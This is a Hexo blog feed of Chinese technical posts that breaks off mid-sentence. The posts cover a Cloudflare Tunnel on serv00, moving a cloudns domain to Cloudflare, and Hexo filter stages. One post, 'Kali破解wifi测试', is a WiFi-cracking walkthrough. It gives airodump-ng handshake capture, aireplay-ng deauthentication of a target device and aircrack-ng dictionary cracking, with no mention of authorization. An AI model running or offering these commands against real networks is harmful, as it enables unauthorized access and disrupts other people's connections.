        <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li><p>将CFTunnel命名为<code>eamon-worker</code>。</p></li><li><p>服务器 主要目录结构：</p><blockquote><p>—home&#x2F;<br>    — 根目录（用户名）&#x2F;<br>    — <code>cloudflared可执行文件</code><br>    — .cloudflared&#x2F;<br>        — <code>cert.pem</code>文件<br>        —  <code>...789abc.json</code><br>        —  <code>config.yml</code></p></blockquote></li></ol><p><strong>注意<code>cloudflared可执行文件</code>所在位置，此种情形下：<br><code>./cloudflared tunnel run</code>等同于<code>~/cloudflared tunnel run</code></strong></p><h2 id="下载cloudflared可执行文件"><a href="#下载cloudflared可执行文件" class="headerlink" title="下载cloudflared可执行文件"></a>下载cloudflared可执行文件</h2><h3 id="方式一："><a href="#方式一：" class="headerlink" title="方式一："></a>方式一：</h3><p>将<a href="https://cloudflared.bowring.uk/binaries/cloudflared-freebsd-2024.11.1.7z">cloudflared可执行文件</a>下载到本地并解压后，上传到serv00服务器目录（此为<code>/home/user</code>根目录）。</p><h3 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h3><p>使用SSH客户端命令行工具 <code>下载、解压、重命名</code>可执行文件，若<code>wget命令</code>被禁用，可用<code>curl -L 命令</code>尝试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://cloudflared.bowring.uk/binaries/cloudflared-freebsd-latest.7z &amp;&amp; 7z x cloudflared-freebsd-latest.7z &amp;&amp; rm cloudflared-freebsd-latest.7z &amp;&amp; mv -f ./temp/* ./cloudflared &amp;&amp; rm -rf temp</span><br></pre></td></tr></table></figure><h2 id="建立CFTunnel的两种方式："><a href="#建立CFTunnel的两种方式：" class="headerlink" title="建立CFTunnel的两种方式："></a>建立CFTunnel的<code>两种</code>方式：</h2><h3 id="方式一：-1"><a href="#方式一：-1" class="headerlink" title="方式一："></a>方式一：</h3><ol><li>登录CF，依次进入<code>zero trust =&gt; 网络 =&gt; Tunnel</code>界面；</li><li>创建<code>Cloudflare隧道</code>，为tunnel命名；</li><li>保存对应使用场景下，自动分配给该tunnel的token令牌；</li><li>填写tunnel将要绑定的hostname和service等信息；</li><li>待tunnel配置完毕后，在SSH命令窗（<code>cloudflared执行文件</code>所在路径）执行以下代码<code>启动CFTunnel</code>：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloudflared tunnel --edge-ip-version auto --protocol http2 --heartbeat-interval 10s run --token &lt;分配的token值`eyJhIjoi...`&gt;</span><br></pre></td></tr></table></figure><h3 id="方式二（CF本地隧道，本地关机有影响）："><a href="#方式二（CF本地隧道，本地关机有影响）：" class="headerlink" title="方式二（CF本地隧道，本地关机有影响）："></a>方式二（CF本地隧道，本地关机有影响）：</h3><p>在SSH命令窗（<code>cloudflared执行文件</code>所在路径）执行以下代码：</p><ol><li>认证CF账（认证成功会生成<code>cert.pem</code>，授予了全局访问权限）</li></ol>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloudflared tunnel login</span><br></pre></td></tr></table></figure><p>  它会给你一个 URL，在浏览器打开并登录 Cloudflare，之后选择你要绑定的域名。<br>2. 创建隧道（创建成功会生成<code>.json认证文件</code>）<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloudflared tunnel create eamon-worker</span><br></pre></td></tr></table></figure><br>  这会返回一个 Tunnel ID，比如：<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Created tunnel eamon-worker with id 12345678-1234-1234-1234-123456789abc</span><br></pre></td></tr></table></figure></p><ol start="3"><li>配置隧道</li></ol>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.cloudflared</span><br><span class="line">nano ~/.cloudflared/config.yml</span><br></pre></td></tr></table></figure><blockquote><p>目的：当请求 eamon-worker.yourdomain.com 时（不怕域名被封），会先经过边缘节点众多的Cloudflare，再到 serv00（也不怕域名被封，ip不被封就没问题），再到eamon.pages.dev。<br>这样 serv00 不需要拥有自己的域名，但可以让 CF 托管的域名动态解析到 eamon.pages.dev，避免 DNS 污染和封锁问题。</p></blockquote><p>config.yml内容如下：<br>  <figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tunnel:</span> <span class="number">12345678</span><span class="number">-1234</span><span class="number">-1234</span><span class="number">-1234</span><span class="string">-123456789abc</span></span><br><span class="line"><span class="attr">credentials-file:</span> <span class="string">/home/你的用户名/.cloudflared/12345678-1234-1234-1234-123456789abc.json</span></span><br><span class="line"><span class="attr">ingress:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostname:</span> <span class="string">eamon-worker.yourdomain.com</span></span><br><span class="line">    <span class="attr">service:</span> <span class="string">https://eamon.pages.dev</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">service:</span> <span class="string">http_status:404</span></span><br></pre></td></tr></table></figure></p><ol start="4"><li>启动CFTunnel</li></ol>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloudflared tunnel run eamon-worker</span><br></pre></td></tr></table></figure><h4 id="⚠️-注意："><a href="#⚠️-注意：" class="headerlink" title="⚠️ 注意："></a>⚠️ 注意：</h4><ol><li><code>hostname</code>需要是你在 Cloudflare 上的 自定义域名。</li><li><code>service</code>是你的目标网站（这里是 eamon.pages.dev）。</li><li><code>.json认证文件</code>会自动生成在<code>~/.cloudflared/</code>里。</li><li>由于 serv00 没有 root 权限，你 不能使用 systemctl 或 sudo，但可以手动运行 cloudflared，然后使用 nohup 或 screen 让它保持后台运行。</li><li>serv00 服务器 会定期杀进程，推荐 cron 保活，因为 screen 或 nohup 无法在进程被杀后自动重启。</li></ol><h2 id="serv00服务器上的CFTunnel保活"><a href="#serv00服务器上的CFTunnel保活" class="headerlink" title="serv00服务器上的CFTunnel保活"></a>serv00服务器上的CFTunnel保活</h2><h4 id="CFTunnel后台运行的2种方式（即使-SSH-断开，它仍然保持运行）："><a href="#CFTunnel后台运行的2种方式（即使-SSH-断开，它仍然保持运行）：" class="headerlink" title="CFTunnel后台运行的2种方式（即使 SSH 断开，它仍然保持运行）："></a>CFTunnel后台运行的2种方式（即使 SSH 断开，它仍然保持运行）：</h4><ol><li>screen，适合手动管理，随时可以进入查看日志</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S cf-tunnel ~/cloudflared tunnel run eamon-worker</span><br></pre></td></tr></table></figure><ol start="2"><li>nohup 方式，比screen轻量级</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后台持续启动</span></span><br><span class="line">nohup ~/cloudflared tunnel run eamon-worker &gt; ~/cloudflared.log 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止 <span class="built_in">nohup</span> 运行</span></span><br><span class="line">pkill -f &quot;cloudflared tunnel&quot;</span><br></pre></td></tr></table></figure><blockquote><p>解释：<br>nohup → 让进程忽略 SIGHUP 信号，SSH 断开后仍继续运行；<br>~&#x2F;cloudflared.log 2&gt;&amp;1 → 把日志输出到 cloudflared.log，便于查看；<br>&amp; → 让进程在后台运行；</p></blockquote><h4 id="cron-自动重启进程（进程挂掉时，5-分钟内自动重启）"><a href="#cron-自动重启进程（进程挂掉时，5-分钟内自动重启）" class="headerlink" title="cron 自动重启进程（进程挂掉时，5 分钟内自动重启）"></a>cron 自动重启进程（进程挂掉时，5 分钟内自动重启）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab -e # 编辑cron任务（取消cron自动重启时，就将内容注释掉）</span><br><span class="line"></span><br><span class="line">*/5 * * * * pgrep -f &quot;cloudflared tunnel&quot; &gt; /dev/null || ./cloudflared tunnel run eamon-worker # 添加命令</span><br><span class="line"></span><br><span class="line">crontab -l # 检查cron是否启用</span><br><span class="line"></span><br><span class="line">pgrep cron || nohup cron &gt; /dev/null 2&gt;&amp;1 &amp; # 手动启用cron</span><br><span class="line"></span><br><span class="line">crontab -r # 清空所有cron任务，慎用！！</span><br></pre></td></tr></table></figure><blockquote><p>解释：<br>*&#x2F;5 * * * * → 每 5 分钟执行一次;<br>pgrep -f “cloudflared tunnel” → 查找是否有 cloudflared tunnel 进程在运行;<br>&#x2F;dev&#x2F;null → 把 pgrep 的输出丢弃（防止 cron 生成不必要的邮件）;<br>|| → 如果 pgrep 找不到进程（即 cloudflared 没在运行），就执行后面的cloudflared tunnel run serv00-tunnel</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali破解wifi测试</title>
      <link href="/posts/kali-po-jie-wifi/"/>
      <url>/posts/kali-po-jie-wifi/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一、wlan0无线网卡-监听不到数据包？"><a href="#一、wlan0无线网卡-监听不到数据包？" class="headerlink" title="一、wlan0无线网卡 监听不到数据包？"></a>一、wlan0无线网卡 监听不到数据包？</h2><ol><li><code>无线网卡断开与外部主机的链接，要直接与虚拟机链接（kali能识别到该网卡），并为网卡wlan0开启监听。</code></li><li><code>热插拔网卡</code>调试。</li><li>卸载重装当前网卡驱动，还不行就换个驱动</li></ol><h2 id="二、wlan0监听过程中总是-down？"><a href="#二、wlan0监听过程中总是-down？" class="headerlink" title="二、wlan0监听过程中总是 down？"></a>二、wlan0监听过程中总是 down？</h2><p>airodump-ng 抓包时，wlan0 总是进入 down 状态，可能是以下原因：</p><ol><li><p><code>NetworkManager</code> 或 <code>wpa_supplicant</code> 进程干扰（可能性不大）</p><p>NetworkManager 和 wpa_supplicant 可能会尝试控制无线网卡，导致 airodump-ng 运行一段时间后 网卡掉线。</p><p>先结束这2个进程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop NetworkManager</span><br><span class="line">sudo systemctl stop wpa_supplicant</span><br></pre></td></tr></table></figure><p>然后重新启动监听模式（重点！！，<code>问题一</code>也可照此修复）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link set wlan0 down</span><br><span class="line">sudo iw dev wlan0 set type monitor</span><br><span class="line">sudo ip link set wlan0 up</span><br></pre></td></tr></table></figure><p>恢复网络连接：如果需要恢复 Wi-Fi 连接，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start NetworkManager</span><br><span class="line">sudo systemctl start wpa_supplicant</span><br></pre></td></tr></table></figure></li><li><p>省电模式导致网卡掉线<br>某些无线网卡在监听模式下会 自动进入省电模式，导致 airodump-ng 停止抓包。</p><p>关闭省电模式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iw dev wlan0 set power_save off</span><br></pre></td></tr></table></figure><p>如果仍然 down，可以尝试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;options iwlwifi power_save=0&quot; | sudo tee /etc/modprobe.d/iwlwifi.conf</span><br><span class="line">sudo systemctl restart NetworkManager</span><br></pre></td></tr></table></figure></li><li><p>网卡驱动问题（卸载、重装）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe -r rtl8xxxu  # 卸载默认驱动</span><br><span class="line">sudo modprobe rtl8xxxu     # 重新加载驱动</span><br></pre></td></tr></table></figure></li></ol><h2 id="三、常用命令："><a href="#三、常用命令：" class="headerlink" title="三、常用命令："></a>三、常用命令：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo reboot # 重启虚拟机</span><br><span class="line"></span><br><span class="line">查看网卡信息</span><br><span class="line">sudo ifconfig 或 sudo iwconfig</span><br><span class="line"></span><br><span class="line">使能网卡监听功能</span><br><span class="line">sudo airmon-ng start wlan0</span><br><span class="line">开始执行监听</span><br><span class="line">sudo airodump-ng wlan0</span><br><span class="line"></span><br><span class="line">删除 当前目录下`wifi-`前缀的 所有文件</span><br><span class="line">sudo rm -f wifi*</span><br><span class="line"></span><br><span class="line">监听目标wifi热点的数据包，抓取的数据保存为`/home/kali/Desktop/`路径下的`wifi-`前缀文件。</span><br><span class="line">sudo airodump-ng -c &lt;wifi热点信道号CH&gt; --bssid &lt;目标wifi地址&gt; -w /home/kali/Desktop/wifi &lt;无线网卡代码&gt;</span><br><span class="line"></span><br><span class="line">攻击目标设备，使其掉线重连</span><br><span class="line">sudo aireplay-ng &lt;`--deauth`或`-0`&gt; 10 -a &lt;目标wifi地址&gt; -c &lt;目标设备地址&gt; &lt;无线网卡代码&gt;</span><br><span class="line"></span><br><span class="line">抓包成功（监听页面右上角会有`WPA handshake`提示）后，用“密码字典pwd.txt”暴力破解，破解成功也有`Found`提示。</span><br><span class="line">sudo aircrack-ng -w /home/kali/Desktop/pwd.txt -b &lt;目标wifi地址&gt; /home/kali/Desktop/wifi-0*.cap</span><br></pre></td></tr></table></figure><h2 id="四、过程概要："><a href="#四、过程概要：" class="headerlink" title="四、过程概要："></a>四、过程概要：</h2><ol><li><p>查看wlan网卡</p><p><img src="/posts/kali-po-jie-wifi/1%E6%9F%A5%E7%9C%8Bwlan%E7%BD%91%E5%8D%A1.webp" alt="查看wlan网卡"></p></li><li><p>监听时生成的文件（监听中）</p><p><img src="/posts/kali-po-jie-wifi/2%E7%9B%91%E5%90%AC%E6%97%B6%E7%94%9F%E6%88%90%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%88%E7%9B%91%E5%90%AC%E4%B8%AD%EF%BC%89.webp" alt="监听时生成的文件（监听中）"></p></li><li><p>攻击设备掉线重连后成功抓到包</p><p><img src="/posts/kali-po-jie-wifi/3%E6%94%BB%E5%87%BB%E8%AE%BE%E5%A4%87%E6%8E%89%E7%BA%BF%E9%87%8D%E8%BF%9E%E5%90%8E%E6%88%90%E5%8A%9F%E6%8A%93%E5%88%B0%E5%8C%85.webp" alt="攻击设备掉线重连后成功抓到包"></p></li><li><p>成功从密码字典中找到密码</p><p><img src="/posts/kali-po-jie-wifi/4%E6%88%90%E5%8A%9F%E4%BB%8E%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8%E4%B8%AD%E6%89%BE%E5%88%B0%E5%AF%86%E7%A0%81.webp" alt="成功从密码字典中找到密码"></p></li></ol><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ol><li>sudo airodump-ng执行后，只有当设备重连网络时，才能抓到数据包；</li><li>一个网卡同一时间只能监听一个ssid频道；</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cloudns域名托管到CF</title>
      <link href="/posts/cloudns-yu-ming-tuo-guan-dao-cf/"/>
      <url>/posts/cloudns-yu-ming-tuo-guan-dao-cf/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="更新cloudns的NS记录和TXT记录"><a href="#更新cloudns的NS记录和TXT记录" class="headerlink" title="更新cloudns的NS记录和TXT记录"></a>更新cloudns的<code>NS记录</code>和<code>TXT记录</code></h2><ol><li><p>得到cloudns域名后，删除cloudns上的旧记录，CF新建站点（该cloudns域名）；</p></li><li><p>首先，将CF提供的“2个NS名称服务器”均添加到cloudns【注意<code>NS</code>记录】；</p></li><li><p>其次，将CF为该域名提供的“2个txt证书（通用、高级）”均添加到cloudns：有以下<code>两种</code>方式：</p><ol><li><p>将证书添加为 两个<code>NS</code>记录：“相同的证书名称”分别指向CF不同的“NS名称服务器”；</p><p><img src="/posts/cloudns-yu-ming-tuo-guan-dao-cf/cloudns%E7%AE%A1%E7%90%86%E7%9A%84%E8%AE%B0%E5%BD%951.webp" alt="cloudns管理的记录1"></p></li><li><p>共添加 四个<code>txt</code>记录：由于每个txt证书name均对应两个证书value，故共有四个证书value。“相同的证书名称”分别指向四个不同的证书value，此四条txt记录添加完毕。</p></li></ol></li></ol><h2 id="CF上的cloudns域名双向解析"><a href="#CF上的cloudns域名双向解析" class="headerlink" title="CF上的cloudns域名双向解析"></a>CF上的cloudns域名<code>双向解析</code></h2><ol><li>不同于其它域名托管，即便已经成功将cloudns域名服务器更换成了CF提供的“NS名称服务器”，之后该域名添加任何新纪录（如A、CNAME等），也必须添加到原来的cloudns域名记录列表中才能生效！<strong><mark class="hl-label red">若只在CF处添加记录而不“同时”在原cloudns添加该记录，无效。</mark> </strong></li><li>之所以将该cloudns域名交由CF共同管理，是为了能使用cloudflare提供的，如cdn，缓存管理等额外服务。<strong><mark class="hl-label red">即，只在原cloudns处添加记录而不“同时”在CF处添加该记录，不影响域名解析，相当于没使用CF服务。</mark> </strong></li></ol><h2 id="CF的worker或pages项目绑定cloudns域名"><a href="#CF的worker或pages项目绑定cloudns域名" class="headerlink" title="CF的worker或pages项目绑定cloudns域名"></a>CF的worker或pages项目绑定cloudns域名</h2><ol><li><p>CF的worker项目添加自定义域名，会自动在CF域名管理处添加<code>worker记录</code>，但在cloudns域名管理处要添加<code>CNAME记录</code>；CF pages项目一直是<code>CNAME记录</code>。</p><p><img src="/posts/cloudns-yu-ming-tuo-guan-dao-cf/CF%E7%AE%A1%E7%90%86%E7%9A%84%E8%AE%B0%E5%BD%952.webp" alt="CF管理的记录2"></p></li><li><p><strong><mark class="hl-label red">注意：</mark> </strong></p> <div class="tip warning"><p>须先要在项目设置处点击添加自定义域名按钮，才会开始DNS解析。若未经项目允许直接添加CNAME记录指向该项目，无效！</p></div> <div class="tip warning"><p>同理，若未经虚拟主机主动添加第三方域名，即便第三方域名直接通过（如A、CNAME等）指向主机项目地址，也难以重定向到该主机项目！</p></div></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo过滤器阶段</title>
      <link href="/posts/hexo-guo-lu-qi-jie-duan/"/>
      <url>/posts/hexo-guo-lu-qi-jie-duan/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一、hexo-g阶段"><a href="#一、hexo-g阶段" class="headerlink" title="一、hexo g阶段"></a>一、hexo g阶段</h2><h3 id="以下是-Hexo-中常用的过滤器阶段及其-执行顺序-的表格说明，按执行顺序排列："><a href="#以下是-Hexo-中常用的过滤器阶段及其-执行顺序-的表格说明，按执行顺序排列：" class="headerlink" title="以下是 Hexo 中常用的过滤器阶段及其 执行顺序 的表格说明，按执行顺序排列："></a>以下是 Hexo 中常用的过滤器阶段及其 执行顺序 的表格说明，按执行顺序排列：</h3><div class = "md-table"><table><thead><tr><th><strong>阶段名称</strong></th><th><strong>触发时机</strong></th><th><strong>执行顺序</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>before_post_render</code></td><td>在渲染文章（如 Markdown 转 HTML）之前触发</td><td>最早</td><td>用于修改文章内容的源文件，比如解析自定义标签或前置处理 Markdown 内容。</td></tr><tr><td><code>after_post_render</code></td><td>在渲染文章后（HTML 已生成）触发</td><td>较早</td><td>用于处理文章渲染后的 HTML，比如添加自定义的 DOM 或属性。</td></tr><tr><td><code>before_render</code></td><td>在渲染文件之前触发</td><td>依赖情况</td><td>渲染所有类型文件（不仅限于文章，如模板、页面等）前触发，用于全局性修改。</td></tr><tr><td><code>after_render</code></td><td>在渲染文件之后触发</td><td>依赖情况</td><td>渲染所有类型文件后触发，常用于压缩 HTML、CSS 或 JS 文件。</td></tr><tr><td><code>before_generate</code></td><td>在开始生成文件之前触发</td><td>中间</td><td>用于在文件生成前进行站点数据的修改或准备工作。</td></tr><tr><td><code>after_generate</code></td><td>在所有文件生成完成后触发</td><td>较晚</td><td>用于修改生成后的文件或添加额外文件，通常用于 SEO 优化或缓存生成等后处理逻辑。</td></tr><tr><td><code>before_exit</code></td><td>在 Hexo 进程结束之前触发</td><td>最晚</td><td>用于清理资源、保存缓存、写日志等退出前的操作。</td></tr></tbody></table></div><h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * AnZhiYu</span></span><br><span class="line"><span class="comment"> * lazyload</span></span><br><span class="line"><span class="comment"> * replace src to data-lazy-src</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> urlFor = <span class="built_in">require</span>(<span class="string">&quot;hexo-util&quot;</span>).<span class="property">url_for</span>.<span class="title function_">bind</span>(hexo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">lazyload</span> = htmlContent =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> error_img = hexo.<span class="property">theme</span>.<span class="property">config</span>.<span class="property">error_img</span>.<span class="property">post_page</span></span><br><span class="line">  <span class="keyword">const</span> bg = hexo.<span class="property">theme</span>.<span class="property">config</span>.<span class="property">lazyload</span>.<span class="property">placeholder</span></span><br><span class="line">    ? <span class="title function_">urlFor</span>(hexo.<span class="property">theme</span>.<span class="property">config</span>.<span class="property">lazyload</span>.<span class="property">placeholder</span>)</span><br><span class="line">    : <span class="string">&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> htmlContent.<span class="title function_">replace</span>(</span><br><span class="line">    <span class="regexp">/(&lt;img(?!.class[\t]*=[\t]*[&#x27;&quot;].*?nolazyload.*?[&#x27;&quot;]).*? src=)/gi</span>,</span><br><span class="line">    <span class="string">`$1 &quot;<span class="subst">$&#123;bg&#125;</span>&quot; data-lazy-src=`</span></span><br><span class="line">  );</span><br><span class="line">  <span class="comment">//   return htmlContent.replace(</span></span><br><span class="line">  <span class="comment">//   /(&lt;img(?!.class[\t]*=[\t]*[&#x27;&quot;].*?nolazyload.*?[&#x27;&quot;]).*? src=)/gi,</span></span><br><span class="line">  <span class="comment">//   `$1 &quot;$&#123;bg&#125;&quot; onerror=&quot;this.onerror=null,this.src=&amp;quot;$&#123;error_img&#125;&amp;quot;&quot; data-lazy-src=`</span></span><br><span class="line">  <span class="comment">// );</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;after_render:html&#x27;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; enable, field &#125; = hexo.<span class="property">theme</span>.<span class="property">config</span>.<span class="property">lazyload</span></span><br><span class="line">  <span class="keyword">if</span> (!enable || field !== <span class="string">&#x27;site&#x27;</span>) <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">lazyload</span>(data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; enable, field &#125; = hexo.<span class="property">theme</span>.<span class="property">config</span>.<span class="property">lazyload</span></span><br><span class="line">  <span class="keyword">if</span> (!enable || field !== <span class="string">&#x27;post&#x27;</span>) <span class="keyword">return</span></span><br><span class="line">  data.<span class="property">content</span> = <span class="title function_">lazyload</span>(data.<span class="property">content</span>)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="二、hexo过滤器-补充："><a href="#二、hexo过滤器-补充：" class="headerlink" title="二、hexo过滤器 补充："></a>二、hexo过滤器 补充：</h2><h3 id="完整的-hexo-extend-filter-register-类别按执行顺序排列："><a href="#完整的-hexo-extend-filter-register-类别按执行顺序排列：" class="headerlink" title="完整的 hexo.extend.filter.register 类别按执行顺序排列："></a>完整的 hexo.extend.filter.register 类别按执行顺序排列：</h3><div class = "md-table"><table><thead><tr><th><strong>事件</strong></th><th><strong>事件名称（<code>hexo.extend.filter.register</code> 类别）</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>初始化阶段</strong></td><td><code>before_init</code> &#x2F; <code>after_init</code></td><td>在Hexo初始化之前和之后触发，允许自定义项目结构和配置。</td></tr><tr><td><strong>清理缓存阶段</strong></td><td><code>before_clean</code> &#x2F; <code>after_clean</code></td><td>在清理缓存之前和之后触发，用于在清理前后执行操作。</td></tr><tr><td><strong>创建新文章</strong></td><td><code>new_post</code></td><td>在创建新文章时触发，用于生成文章文件或执行额外的初始化操作。</td></tr><tr><td><strong>处理文章内容阶段</strong></td><td><code>before_post_render</code> &#x2F; <code>after_post_render</code></td><td>文章渲染前后触发，常用于插入文章的附加内容（如社交按钮等）。 整篇文章对象（包括 front-matter 元数据和原始内容）</td></tr><tr><td><strong>内容处理阶段</strong></td><td><code>before_content_render</code> &#x2F; <code>after_content_render</code></td><td>用于文章内容的渲染前后，进行内容修改或格式化。仅文章内容部分（不包括 front-matter）</td></tr><tr><td><strong>渲染页面阶段</strong></td><td><code>before_render</code> &#x2F; <code>after_render</code></td><td>在渲染页面内容之前和之后触发，允许修改渲染流程或渲染后的内容（在HTML&#x2F;CSS&#x2F;JS等任何类型判断前）。</td></tr><tr><td><strong>渲染HTML页面阶段</strong></td><td><code>after_render:html</code></td><td>在HTML渲染完成后触发，用于修改或插入HTML结构，例如SEO优化等。（类型识别完成后，仅 HTML）</td></tr><tr><td><strong>生成阶段</strong></td><td><code>before_generate</code> &#x2F; <code>after_generate</code></td><td>在生成页面前后触发，允许修改或处理页面内容。</td></tr><tr><td><strong>部署阶段</strong></td><td><code>before_deploy</code> &#x2F; <code>after_deploy</code></td><td>在部署之前和之后触发，用于自定义部署流程。</td></tr><tr><td><strong>服务器启动阶段</strong></td><td><code>before_serve</code> &#x2F; <code>after_serve</code></td><td>在本地服务器启动前后触发，用于开发环境中的调试和优化。</td></tr><tr><td><strong>发布后处理阶段</strong></td><td><code>after_publish</code></td><td>在Hexo发布后触发，通常用于清理、日志记录或其他后期操作。</td></tr></tbody></table></div><h2 id="三、拓展"><a href="#三、拓展" class="headerlink" title="三、拓展"></a>三、拓展</h2><p><strong>备份</strong>（<code>filters</code>、<code>events</code>、<code>helpers</code>等）<strong>不同类型</strong>的hexo脚本，在hexo加载时，可能对项目会有不同程度的影响。</p><ol><li><code>filters (过滤器)</code> - 🚫 最易受影响 (重复执行)</li></ol><p>问题本质： 使用 hexo.extend.filter.register(‘filter_name’, function(){…}) 注册的过滤器是 全局注册 到 Hexo 实例上的。</p><p>重复执行： 如果在 两个不同的 .js 文件 中（即使是主题目录下的不同子目录），注册了 同名 的过滤器（’filter_name’），那么 